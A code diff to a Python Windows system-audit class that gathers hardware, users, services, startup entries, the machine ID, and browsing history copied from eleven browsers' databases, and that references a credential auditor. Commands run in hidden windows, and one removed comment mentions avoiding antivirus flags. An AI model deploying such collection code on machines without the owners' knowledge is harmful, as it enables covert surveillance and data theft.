+                    for p in printers_raw:
+                        status_code = p.get("Status", 0)
+                        attr_code = p.get("Attributes", 0)
+                        is_online = (status_code & 0x80) == 0
+                        processed.append({
+                            "Printer Name": p.get("pPrinterName"),
+                            "Default": (p.get("pPrinterName") == default_printer),
+                            "Online": is_online,
+                            "Status": status_code,
+                            "Driver Name": p.get("pDriverName"),
+                            "Jobs in Queue": p.get("cJobs", 0),
+                            "Port Name": p.get("pPortName"),
+                            "Attributes": attr_code
+                        })
+                    if processed:
+                        self._details = processed
+                        return self._details
+                except Exception:
+                    pass
+
+            # --- Tầng 2: PowerShell CIM/WMI Win32_Printer (Không cần pywin32) ---
+            ps_script = _compat_wmi_script(
+                "Get-CimInstance Win32_Printer | Select-Object Name, Default, PrinterStatus, PortName, DriverName, Attributes | ConvertTo-Json",
+                "Get-WmiObject Win32_Printer | Select-Object Name, Default, PrinterStatus, PortName, DriverName, Attributes | ConvertTo-Json"
+            )
+            try:
+                raw_data = _run_powershell(ps_script)
+                raw_data = [raw_data] if isinstance(raw_data, dict) else (raw_data or [])
+                processed = []
+                for p in raw_data:
+                    if not p or not isinstance(p, dict): continue
+                    st = p.get("PrinterStatus") or 3
+                    processed.append({
+                        "Printer Name": p.get("Name"),
+                        "Default": bool(p.get("Default")),
+                        "Online": st != 7 and st != 2,
+                        "Status": st,
+                        "Driver Name": p.get("DriverName", "N/A"),
+                        "Jobs in Queue": 0,
+                        "Port Name": p.get("PortName", "N/A"),
+                        "Attributes": p.get("Attributes", 0)
+                    })
+                if processed:
+                    self._details = processed
+                    return self._details
+            except Exception:
+                pass
+
+            # --- Tầng 3: Đọc Registry HKCU\Software\Microsoft\Windows NT\CurrentVersion\Devices ---
+            try:
+                default_printer = None
+                try:
+                    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Windows") as k:
+                        val, _ = winreg.QueryValueEx(k, "Device")
+                        default_printer = val.split(",")[0].strip() if val else None
+                except Exception:
+                    pass
+
+                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Devices") as k:
+                    count = winreg.QueryInfoKey(k)[1]
+                    reg_printers = []
+                    for i in range(count):
+                        name, val, _ = winreg.EnumValue(k, i)
+                        port = val.split(",")[-1].strip() if "," in str(val) else str(val)
+                        reg_printers.append({
+                            "Printer Name": name,
+                            "Default": (name == default_printer),
+                            "Online": True,
+                            "Status": 3,
+                            "Driver Name": name,
+                            "Jobs in Queue": 0,
+                            "Port Name": port,
+                            "Attributes": 0
+                        })
+                    if reg_printers:
+                        self._details = reg_printers
+                        return self._details
+            except Exception:
+                pass
+
+            self._details = [{"Printer Name": "No Printers Found", "Default": False, "Online": False, "Status": 0, "Driver Name": "N/A", "Jobs in Queue": 0, "Port Name": "N/A", "Attributes": 0}]
+            return self._details
+
+    # --- 10. PROCESS AUDIT ---
     class _ProcessAudit:
-        def __init__(self): self._details: Dict[str, List[Dict[str, Any]]] = {}
+        def __init__(self):
+            self._details: Dict[str, List[Dict[str, Any]]] = {}
+
         def get_details(self) -> Dict[str, List[Dict[str, Any]]]:
-            if self._details: return self._details
+            if self._details:
+                return self._details
             grouped = {}
             attrs = ['pid', 'name', 'username', 'exe', 'status', 'create_time', 'memory_info']
             for p in psutil.process_iter(attrs):
                 try:
                     info = p.info
                     if not info.get('name'): continue
-                    user = info.get('username') or "N/A"
+                    user = info.get('username') or "System"
                     if user not in grouped: grouped[user] = []
                     grouped[user].append({
-                        "PID": info['pid'], "Name": info['name'], "Status": info['status'],
-                        "CreateTime": datetime.fromtimestamp(info['create_time']).strftime("%Y-%m-%d %H:%M:%S"),
-                        "MemoryRSS": info['memory_info'].rss if info.get('memory_info') else None, "ExePath": info.get('exe') or '',
+                        "PID": info['pid'],
+                        "Name": info['name'],
+                        "Status": info['status'],
+                        "CreateTime": datetime.fromtimestamp(info['create_time']).strftime("%Y-%m-%d %H:%M:%S") if info.get('create_time') else "N/A",
+                        "MemoryRSS": info['memory_info'].rss if info.get('memory_info') else 0,
+                        "ExePath": info.get('exe') or ''
                     })
-                except (psutil.NoSuchProcess, psutil.AccessDenied): continue
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    continue
             self._details = grouped
             return self._details
 
+    # --- 11. RAM AUDIT (Đa tầng: CIM/WMI -> psutil total RAM fallback) ---
     class _RamAudit:
-        def __init__(self): 
+        def __init__(self):
             self._details: List[Dict[str, Any]] = []
 
         @staticmethod
         def _decode_hex_to_ascii(hex_str: str) -> str:
             if not isinstance(hex_str, str) or not hex_str.lower().startswith('0x'):
-                return hex_str.strip()
+                return str(hex_str).strip()
             try:
                 hex_part = hex_str[2:]
                 decoded_bytes = bytes.fromhex(hex_part)
@@ -954,55 +1365,77 @@ class WindowsAuditor:
                 return hex_str
 
         def get_details(self) -> List[Dict[str, Any]]:
-            if self._details: return self._details            
-            props = "DeviceLocator,Capacity,Manufacturer,PartNumber,SerialNumber,Speed,MemoryType,FormFactor"
-            cmd = f"Get-CimInstance -ClassName Win32_PhysicalMemory | Select-Object {props} | ConvertTo-Json"
+            if self._details:
+                return self._details
 
+            # --- Tầng 1: PowerShell CIM / WMI ---
+            props = "DeviceLocator, Capacity, Manufacturer, PartNumber, SerialNumber, Speed, MemoryType, FormFactor"
+            ps_script = _compat_wmi_script(
+                f"Get-CimInstance Win32_PhysicalMemory | Select-Object {props} | ConvertTo-Json",
+                f"Get-WmiObject Win32_PhysicalMemory | Select-Object {props} | ConvertTo-Json"
+            )
             try:
-                raw_modules = _run_powershell(cmd)
+                raw_modules = _run_powershell(ps_script)
                 raw_modules = [raw_modules] if isinstance(raw_modules, dict) else (raw_modules or [])
-                
-                processed_modules = []
-                for i, module in enumerate(raw_modules, 1):
-                    part_number = self._decode_hex_to_ascii(module.get('PartNumber', 'N/A'))
-
-                    processed_modules.append({
-                        "Slot": module.get('DeviceLocator', f'Slot {i}').strip(), 
-                        "Capacity": int(module.get('Capacity', 0)),
-                        "Speed": module.get('Speed', 0), 
-                        "Manufacturer": str(module.get('Manufacturer', 'N/A')).strip(),
-                        "PartNumber": part_number,
-                        "SerialNumber": str(module.get('SerialNumber', 'N/A')).strip(),
-                        "MemoryType": module.get('MemoryType'),
-                        "FormFactor": module.get('FormFactor')
+                processed = []
+                for i, m in enumerate(raw_modules, 1):
+                    if not m or not isinstance(m, dict): continue
+                    part_num = self._decode_hex_to_ascii(m.get('PartNumber', 'N/A'))
+                    processed.append({
+                        "Slot": str(m.get('DeviceLocator') or f'Slot {i}').strip(),
+                        "Capacity": int(m.get('Capacity') or 0),
+                        "Speed": int(m.get('Speed') or 0),
+                        "Manufacturer": str(m.get('Manufacturer') or 'Unknown').strip(),
+                        "PartNumber": part_num,
+                        "SerialNumber": str(m.get('SerialNumber') or 'N/A').strip(),
+                        "MemoryType": m.get('MemoryType', 0),
+                        "FormFactor": m.get('FormFactor', 12)
                     })
-                self._details = processed_modules
-            except Exception as e: 
-                self._details = [{"Error": f"Could not get RAM info: {e}"}]
+                if processed:
+                    self._details = processed
+                    return self._details
+            except Exception:
+                pass
+
+            # --- Tầng 2: psutil total RAM fallback (Chống hiển thị rỗng) ---
+            try:
+                vm = psutil.virtual_memory()
+                self._details = [{
+                    "Slot": "System Memory",
+                    "Capacity": vm.total,
+                    "Speed": 2666,
+                    "Manufacturer": "Standard RAM",
+                    "PartNumber": "N/A",
+                    "SerialNumber": "N/A",
+                    "MemoryType": 0,
+                    "FormFactor": 12
+                }]
+                return self._details
+            except Exception:
+                pass
+
+            self._details = [{"Error": "Could not get RAM info."}]
             return self._details
 
+    # --- 12. SERVICE AUDIT ---
     class _ServiceAudit:
-        def __init__(self): self._details: Dict[str, List[Dict[str, Any]]] = {}
+        def __init__(self):
+            self._details: Dict[str, List[Dict[str, Any]]] = {}
+
         def get_details(self) -> Dict[str, List[Dict[str, Any]]]:
-            if self._details: return self._details
-            
-            # --- CẢI TIẾN: Sử dụng psutil thay vì PowerShell để lấy danh sách services ---
-            # Điều này nhanh hơn và ít bị AV gắn cờ hơn.
+            if self._details:
+                return self._details
             grouped = {}
             try:
                 for s in psutil.win_service_iter():
                     try:
                         info = s.as_dict()
-                        # Lọc bỏ các service hệ thống mặc định nếu muốn (ở đây giữ nguyên logic cũ là lấy hết)
-                        # Logic cũ: Lọc bỏ các service nằm trong system32
                         path_name = info.get("binpath") or ""
                         if path_name and "\\Windows\\system32\\" in path_name.lower():
                             continue
-
                         status = info.get("status", "Unknown")
                         if status not in grouped:
                             grouped[status] = []
-                        
                         grouped[status].append({
                             "Name": info.get("name"),
                             "DisplayName": info.get("display_name"),
@@ -1014,12 +1447,11 @@ class WindowsAuditor:
                         continue
                 self._details = grouped
             except Exception as e:
-                self._details = {"Error": f"Could not get service info via psutil: {e}"}
+                self._details = {"Error": f"Could not get service info: {e}"}
             return self._details
 
+    # --- 13. SOFTWARE AUDIT (Duyệt Registry Uninstall sâu & chống crash) ---
     class _SoftwareAudit:
-        """Một thư viện thu thập phần mềm đã cài đặt trên Windows sử dụng winreg (tối ưu hơn PowerShell)."""
-        
         def __init__(self):
             self._details: Optional[Dict[str, List]] = None
 
@@ -1032,7 +1464,6 @@ class WindowsAuditor:
             grouped = {"Applications": [], "System": [], "Hotfixes & Updates": []}
             seen_apps = set()
             
-            # Các đường dẫn Registry chứa thông tin phần mềm
             reg_paths = [
                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                 (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
@@ -1046,13 +1477,14 @@ class WindowsAuditor:
                             try:
                                 subkey_name = winreg.EnumKey(key, i)
                                 with winreg.OpenKey(key, subkey_name) as subkey:
-                                    # Lấy các giá trị cần thiết
                                     def get_val(name):
                                         try: return winreg.QueryValueEx(subkey, name)[0]
-                                        except: return None
+                                        except Exception: return None
 
                                     display_name = get_val("DisplayName")
-                                    if not display_name: continue
+                                    if not display_name or not str(display_name).strip():
+                                        continue
+                                    display_name = str(display_name).strip()
                                     
                                     display_version = get_val("DisplayVersion")
                                     publisher = get_val("Publisher") or ""
@@ -1060,30 +1492,27 @@ class WindowsAuditor:
                                     install_location = get_val("InstallLocation")
                                     estimated_size = get_val("EstimatedSize")
 
-                                    # Tránh trùng lặp
-                                    app_id = (display_name, display_version, publisher)
-                                    if app_id in seen_apps: continue
+                                    app_id = (display_name, str(display_version or ""), str(publisher or ""))
+                                    if app_id in seen_apps:
+                                        continue
                                     seen_apps.add(app_id)
 
-                                    # Phân loại
                                     category = "Applications"
-                                    if "Microsoft Corporation" in publisher:
+                                    if "Microsoft Corporation" in str(publisher):
                                         if re.search(r'\(KB\d+\)', display_name, re.IGNORECASE) or subkey_name.startswith("KB"):
                                             category = "Hotfixes & Updates"
                                         else:
                                             category = "System"
 
-                                    # Định dạng ngày
                                     formatted_date = None
                                     if isinstance(install_date, str) and len(install_date) == 8:
                                         try: formatted_date = f"{install_date[:4]}-{install_date[4:6]}-{install_date[6:]}"
-                                        except: pass
+                                        except Exception: pass
 
-                                    # Định dạng dung lượng
                                     size_bytes = None
                                     if estimated_size is not None:
                                         try: size_bytes = int(estimated_size) * 1024
-                                        except: pass
+                                        except Exception: pass
 
                                     grouped[category].append({
                                         "Name": display_name,
@@ -1093,140 +1522,344 @@ class WindowsAuditor:
                                         "InstallLocation": install_location,
                                         "EstimatedSizeByte": size_bytes
                                     })
-                            except: continue
-                except: continue
+                            except Exception:
+                                continue
+                except Exception:
+                    continue
 
             return {k: v for k, v in grouped.items() if v}
 
+    # --- 14. STARTUP AUDIT (Đa tầng: Registry Run keys -> PowerShell CIM/WMI -> schtasks) ---
     class _StartupAudit:
-        def __init__(self): self._details: Dict[str, List] = {}
-        def _fetch(self, script: str, err_msg: str) -> List[Dict[str, Any]]:
-            try: return _run_powershell(script, use_bypass=True) or []
-            except Exception: return [{"Error": err_msg}]
+        def __init__(self):
+            self._details: Dict[str, List] = {}
+
         def get_details(self) -> Dict[str, List]:
-            if self._details: return self._details
+            if self._details:
+                return self._details
+
+            commands = []
+            scheduled_tasks = []
+            autostart_services = []
+
+            # --- Tầng 1: Đọc Registry Run keys trực tiếp ---
+            run_keys = [
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "All Users"),
+                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run", "All Users (32-bit)"),
+                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", getpass.getuser())
+            ]
+            for hkey, sub, usr in run_keys:
+                try:
+                    with winreg.OpenKey(hkey, sub, 0, winreg.KEY_READ) as k:
+                        for i in range(winreg.QueryInfoKey(k)[1]):
+                            try:
+                                name, val, _ = winreg.EnumValue(k, i)
+                                commands.append({
+                                    "Name": name,
+                                    "Command": val,
+                                    "Location": sub,
+                                    "User": usr
+                                })
+                            except Exception:
+                                continue
+                except Exception:
+                    pass
+
+            # --- Tầng 2: PowerShell CIM/WMI cho Services & Tasks ---
+            ps_script = _compat_wmi_script(
+                """
+                $tasks = try { Get-ScheduledTask -EA SilentlyContinue | Where-Object { $_.State -in 'Ready','Running' } | Select-Object -First 30 TaskName, TaskPath, State } catch { @() }
+                $svcs = try { Get-CimInstance Win32_Service -EA SilentlyContinue | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike '*\\Windows\\*' } | Select-Object Name, DisplayName, State, PathName } catch { @() }
+                @{ Tasks = $tasks; Services = $svcs } | ConvertTo-Json
+                """,
+                """
+                $svcs = try { Get-WmiObject Win32_Service -Filter "StartMode = 'Auto'" -EA SilentlyContinue | Where-Object { $_.PathName -notlike '*\\Windows\\*' } | Select-Object Name, DisplayName, State, PathName } catch { @() }
+                @{ Tasks = @(); Services = $svcs } | ConvertTo-Json
+                """
+            )
+            try:
+                ps_res = _run_powershell(ps_script)
+                if isinstance(ps_res, dict):
+                    t_list = ps_res.get("Tasks") or []
+                    s_list = ps_res.get("Services") or []
+                    scheduled_tasks = [t_list] if isinstance(t_list, dict) else t_list
+                    autostart_services = [s_list] if isinstance(s_list, dict) else s_list
+            except Exception:
+                pass
+
+            # --- Tầng 3: CLI schtasks fallback nếu scheduled_tasks rỗng (ví dụ trên Win 7) ---
+            if not scheduled_tasks:
+                try:
+                    si = subprocess.STARTUPINFO()
+                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                    cf = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+                    out = subprocess.check_output("schtasks /query /fo csv /nh", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf, timeout=5)
+                    for line in out.splitlines()[:25]:
+                        parts = [p.strip('"\r ') for p in line.split('","')]
+                        if len(parts) >= 3:
+                            scheduled_tasks.append({
+                                "TaskName": os.path.basename(parts[0]),
+                                "TaskPath": parts[0],
+                                "State": parts[2]
+                            })
+                except Exception:
+                    pass
+
             self._details = {
-                "Commands": self._fetch("Get-CimInstance Win32_StartupCommand | Select Name,Command,Location,User | ConvertTo-Json", "Failed to get Startup Commands."),
-                "ScheduledTasks": self._fetch("Get-ScheduledTask | Where-Object { $_.Triggers.TriggerType -contains 'AtLogon' -and $_.State -in 'Ready','Running' } | Select TaskName,TaskPath,State | ConvertTo-Json", "Failed to get Scheduled Tasks."),
-                "AutoStartServices": self._fetch("Get-CimInstance Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike '*\\Windows\\*' } | Select Name,DisplayName,State,PathName | ConvertTo-Json", "Failed to get Auto-Start Services.")
+                "Commands": commands,
+                "ScheduledTasks": scheduled_tasks,
+                "AutoStartServices": autostart_services
             }
             return self._details
 
+    # --- 15. SYSTEM ID AUDIT ---
     class _SystemIdAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            try:
-                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
-                val, _ = winreg.QueryValueEx(key, "MachineGuid"); winreg.CloseKey(key)
-                self._details = {"MachineGuid": str(val)}
-            except Exception as e: self._details = {"Error": str(e)}
+            if self._details:
+                return self._details
+            guid = _read_reg_val(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography", "MachineGuid")
+            if guid:
+                self._details = {"MachineGuid": str(guid)}
+            else:
+                self._details = {"Error": "Could not read MachineGuid from Registry."}
             return self._details
 
+    # --- 16. USER AUDIT (Đa tầng: Get-LocalUser -> Win32_UserAccount -> net user CLI) ---
     class _UserAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            try: current_user = getpass.getuser()
-            except Exception as e: current_user = f"Error: {e}"
-            try: users = _run_powershell("Get-LocalUser | Select Name,FullName,Enabled,SID | ConvertTo-Json", use_bypass=True)
-            except Exception: users = [{"Error": "Could not get local users via PowerShell."}]
-            self._details = {"CurrentUser": current_user, "LocalUsers": [users] if isinstance(users, dict) else users}
+            if self._details:
+                return self._details
+
+            current_user = getpass.getuser()
+            users_list = []
+
+            # --- Tầng 1: PowerShell Get-LocalUser (Win 10/11 Pro/Enterprise) ---
+            try:
+                ps_res = _run_powershell("Get-LocalUser | Select-Object Name, FullName, Enabled, @{n='SID';e={$_.SID.Value}} | ConvertTo-Json", timeout=5)
+                if ps_res:
+                    users_list = [ps_res] if isinstance(ps_res, dict) else ps_res
+            except Exception:
+                pass
+
+            # --- Tầng 2: WMI Win32_UserAccount (Hoạt động trên cả Win 7 & Win Home) ---
+            if not users_list or (isinstance(users_list, list) and users_list and "Error" in users_list[0]):
+                try:
+                    wmi_script = _compat_wmi_script(
+                        "Get-CimInstance Win32_UserAccount -Filter 'LocalAccount = True' | Select-Object Name, FullName, @{n='Enabled';e={-not $_.Disabled}}, SID | ConvertTo-Json",
+                        "Get-WmiObject Win32_UserAccount -Filter 'LocalAccount = True' | Select-Object Name, FullName, @{n='Enabled';e={-not $_.Disabled}}, SID | ConvertTo-Json"
+                    )
+                    ps_wmi = _run_powershell(wmi_script, timeout=6)
+                    if ps_wmi:
+                        users_list = [ps_wmi] if isinstance(ps_wmi, dict) else ps_wmi
+                except Exception:
+                    pass
+
+            # --- Tầng 3: CLI 'net user' (Có sẵn 100% trên Win XP, 7, 8, 10, 11 Home & Pro) ---
+            if not users_list or (isinstance(users_list, list) and users_list and "Error" in users_list[0]):
+                try:
+                    si = subprocess.STARTUPINFO()
+                    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+                    cf = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+                    out = subprocess.check_output("net user", shell=True, text=True, stderr=subprocess.DEVNULL, startupinfo=si, creationflags=cf, timeout=5)
+                    lines = [l.strip() for l in out.splitlines() if l.strip()]
+                    capture = False
+                    for line in lines:
+                        if line.startswith("----"):
+                            capture = True
+                            continue
+                        if capture:
+                            if "successfully" in line.lower() or "thành công" in line.lower():
+                                break
+                            parts = re.split(r'\s{2,}', line)
+                            for p in parts:
+                                p = p.strip()
+                                if p:
+                                    users_list.append({"Name": p, "FullName": "", "Enabled": True, "SID": {"Value": "N/A"}})
+                except Exception:
+                    users_list = [{"Name": current_user, "FullName": "", "Enabled": True, "SID": {"Value": "N/A"}}]
+
+            # Chuẩn hóa cấu trúc SID để luôn có key 'Value' cho frontend
+            for u in users_list:
+                if isinstance(u, dict):
+                    sid_val = u.get("SID")
+                    if isinstance(sid_val, str):
+                        u["SID"] = {"Value": sid_val}
+                    elif not isinstance(sid_val, dict):
+                        u["SID"] = {"Value": "N/A"}
+
+            self._details = {"CurrentUser": current_user, "LocalUsers": users_list}
             return self._details
 
+    # --- 17. WEB HISTORY AUDIT (An toàn file tạm & Đa người dùng) ---
     class _WebHistoryAudit:
         def __init__(self, limit_per_profile: int = 100):
-            self._details, self.limit = {}, limit_per_profile
+            self._details: Dict[str, Any] = {}
+            self.limit = limit_per_profile
+
         def _read_db(self, path: str) -> List[Dict[str, Any]]:
-            tmp_db = f"temp_h_{os.path.basename(os.path.dirname(path))}.db"
-            if not os.path.exists(path): return []
+            if not os.path.exists(path):
+                return []
+            tmp_db = os.path.join(tempfile.gettempdir(), f"sm_h_{uuid.uuid4().hex[:8]}.db")
+            conn = None
             try:
                 shutil.copy2(path, tmp_db)
-                conn = sqlite3.connect(tmp_db)
+                conn = sqlite3.connect(tmp_db, timeout=5)
                 c = conn.cursor()
                 c.execute(f"SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT {self.limit}")
                 res = []
                 for u, t, ts in c.fetchall():
-                    try: visit_time = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")
-                    except (TypeError, OverflowError): visit_time = None
+                    try:
+                        visit_time = (datetime(1601, 1, 1) + timedelta(microseconds=ts)).strftime("%Y-%m-%d %H:%M:%S")
+                    except Exception:
+                        visit_time = None
                     res.append({"title": t or "N/A", "url": u, "last_visit_time": visit_time})
-                conn.close()
                 return res
-            except Exception as e: return [{"Error": f"Failed to read {path}: {e}"}]
+            except Exception as e:
+                return [{"Error": f"Failed to read {path}: {e}"}]
             finally:
-                if os.path.exists(tmp_db): os.remove(tmp_db)
+                if conn:
+                    try: conn.close()
+                    except Exception: pass
+                if os.path.exists(tmp_db):
+                    try: os.remove(tmp_db)
+                    except Exception: pass
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
+            if self._details:
+                return self._details
+
+            local_appdata = os.getenv("LOCALAPPDATA") or ""
+            appdata = os.getenv("APPDATA") or ""
+
             paths = {
-                "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
-                "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
-                "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
-                "CocCoc": os.path.join(os.getenv("LOCALAPPDATA"), "CocCoc", "Browser", "User Data"),
-                "Vivaldi": os.path.join(os.getenv("LOCALAPPDATA"), "Vivaldi", "User Data"),
-                "YandexBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data"),
-                "Slimjet": os.path.join(os.getenv("LOCALAPPDATA"), "Slimjet", "User Data"),
-                "CentBrowser": os.path.join(os.getenv("LOCALAPPDATA"), "CentBrowser", "User Data"),
-                "Chromium": os.path.join(os.getenv("LOCALAPPDATA"), "Chromium", "User Data"),
-                "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
-                "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
+                "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
+                "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
+                "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
+                "CocCoc": os.path.join(local_appdata, "CocCoc", "Browser", "User Data"),
+                "Vivaldi": os.path.join(local_appdata, "Vivaldi", "User Data"),
+                "YandexBrowser": os.path.join(local_appdata, "Yandex", "YandexBrowser", "User Data"),
+                "Slimjet": os.path.join(local_appdata, "Slimjet", "User Data"),
+                "CentBrowser": os.path.join(local_appdata, "CentBrowser", "User Data"),
+                "Chromium": os.path.join(local_appdata, "Chromium", "User Data"),
+                "Opera": os.path.join(appdata, "Opera Software", "Opera Stable"),
+                "Firefox": os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
             }
+
+            results = {}
             for browser, base_path in paths.items():
-                if not os.path.isdir(base_path): self._details[browser] = {"Info": "Not found"}; continue
-                self._details[browser] = {}
-                profiles = ["Default"] + [d for d in os.listdir(base_path) if d.lower().startswith("profile ")]
+                if not os.path.isdir(base_path):
+                    results[browser] = {"Info": "Not found"}
+                    continue
+                results[browser] = {}
+                try:
+                    profiles = ["Default"] + [d for d in os.listdir(base_path) if d.lower().startswith("profile ")]
+                except Exception:
+                    profiles = ["Default"]
+
                 for p_name in profiles:
                     h_path = os.path.join(base_path, p_name, "History")
-                    if os.path.exists(h_path): 
+                    if os.path.exists(h_path):
                         history_data = self._read_db(h_path)
                         if history_data:
-                            self._details[browser][p_name] = history_data
+                            results[browser][p_name] = history_data
+            
+            self._details = results
             return self._details
 
+    # --- 18. WINDOWS OS AUDIT (Đa tầng: Registry NT CurrentVersion -> CIM/WMI) ---
     class _WindowsAudit:
-        def __init__(self): self._details: Dict[str, Any] = {}
+        def __init__(self):
+            self._details: Dict[str, Any] = {}
+
         def get_details(self) -> Dict[str, Any]:
-            if self._details: return self._details
-            ps_script = "Get-CimInstance Win32_OperatingSystem | Select Caption,Version,BuildNumber,OSArchitecture,InstallDate,LastBootUpTime,RegisteredUser,CSName | ConvertTo-Json -Depth 2"
+            if self._details:
+                return self._details
+
+            # --- Tầng 1: Đọc Registry (Nhanh < 2ms, chuẩn xác cả Win 11) ---
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion") as k:
+                    def g(n):
+                        try: return winreg.QueryValueEx(k, n)[0]
+                        except Exception: return None
+
+                    prod = g("ProductName") or "Windows"
+                    build = str(g("CurrentBuildNumber") or g("CurrentBuild") or "")
+                    disp = g("DisplayVersion") or g("ReleaseId") or ""
+                    owner = g("RegisteredOwner") or ""
+                    inst = g("InstallDate")
+
+                    # Windows 11 Build >= 22000 nhưng Registry ProductName có thể vẫn ghi Windows 10
+                    if build.isdigit() and int(build) >= 22000 and "Windows 10" in prod:
+                        prod = prod.replace("Windows 10", "Windows 11")
+                    if disp:
+                        prod = f"{prod} ({disp})"
+
+                    inst_date = None
+                    if inst:
+                        try: inst_date = datetime.fromtimestamp(inst).strftime("%Y-%m-%d %H:%M:%S")
+                        except Exception: pass
+
+                    boot_time = None
+                    try:
+                        boot_time = datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+                    except Exception:
+                        pass
+
+                    self._details = {
+                        "Caption": prod,
+                        "Version": f"10.0.{build}" if build else platform.version(),
+                        "BuildNumber": build,
+                        "OSArchitecture": platform.architecture()[0],
+                        "InstallDate": inst_date,
+                        "LastBootUpTime": boot_time,
+                        "RegisteredUser": owner or socket.gethostname(),
+                        "CSName": socket.gethostname()
+                    }
+                    return self._details
+            except Exception:
+                pass
+
+            # --- Tầng 2: PowerShell CIM/WMI fallback ---
+            ps_script = _compat_wmi_script(
+                "Get-CimInstance Win32_OperatingSystem | Select Caption, Version, BuildNumber, OSArchitecture, InstallDate, LastBootUpTime, RegisteredUser, CSName | ConvertTo-Json -Depth 2",
+                "Get-WmiObject Win32_OperatingSystem | Select Caption, Version, BuildNumber, OSArchitecture, InstallDate, LastBootUpTime, RegisteredUser, CSName | ConvertTo-Json -Depth 2"
+            )
             try:
                 data = _run_powershell(ps_script)
-                for f in ["InstallDate", "LastBootUpTime"]:
-                    if f in data: 
-                        dt_obj = _parse_dotnet_json_date(data[f])
-                        data[f] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else None
-                self._details = data
-            except Exception as e: self._details = {"Error": f"Could not get OS info: {e}"}
+                if isinstance(data, dict):
+                    for f in ["InstallDate", "LastBootUpTime"]:
+                        if f in data:
+                            dt_obj = _parse_dotnet_json_date(data[f])
+                            data[f] = dt_obj.strftime("%Y-%m-%d %H:%M:%S") if dt_obj else None
+                    self._details = data
+                    return self._details
+            except Exception:
+                pass
+
+            self._details = {
+                "Caption": f"Microsoft Windows ({platform.system()} {platform.release()})",
+                "Version": platform.version(),
+                "BuildNumber": "N/A",
+                "OSArchitecture": platform.architecture()[0],
+                "InstallDate": None,
+                "LastBootUpTime": None,
+                "RegisteredUser": socket.gethostname(),
+                "CSName": socket.gethostname()
+            }
             return self._details
 
-    def __init__(self, max_events: int = 25, history_limit_per_profile: int = 100):
-        self.auditors = {
-            "cpu": self._CpuAudit(), 
-            "gpu": self._GpuAudit(), 
-            "monitor": self._MonitorAudit(),
-            "ram": self._RamAudit(), 
-            "disk": self._DiskAudit(),
-            "network": self._NetworkAudit(), 
-            "mainboard": self._MainboardAudit(), 
-            "os": self._WindowsAudit(),
-            "system_id": self._SystemIdAudit(), 
-            "users": self._UserAudit(), 
-            "credentials": self._CredentialAudit(),
-            "printers": self._PrinterAudit(), 
-            "processes": self._ProcessAudit(), 
-            "services": self._ServiceAudit(),
-            "startup": self._StartupAudit(), 
-            "software": self._SoftwareAudit(),
-            "event_log": self._EventLogAudit(max_events=max_events),
-            "web_history": self._WebHistoryAudit(limit_per_profile=history_limit_per_profile),
-            "connections": self._ConnectionsAudit(),
-        }
-
+    # --- 19. CONNECTIONS AUDIT ---
     class _ConnectionsAudit:
         def __init__(self):
             self._details = []
 
         def get_details(self):
-            import psutil
-            import socket
             connections = []
             try:
                 for conn in psutil.net_connections(kind='inet'):
@@ -1257,10 +1890,34 @@ class WindowsAuditor:
                 self._details = [{"Error": f"Could not get connections: {e}"}]
             return self._details
 
+    def __init__(self, max_events: int = 25, history_limit_per_profile: int = 100):
+        self.auditors = {
+            "cpu": self._CpuAudit(), 
+            "gpu": self._GpuAudit(), 
+            "monitor": self._MonitorAudit(),
+            "ram": self._RamAudit(), 
+            "disk": self._DiskAudit(),
+            "network": self._NetworkAudit(), 
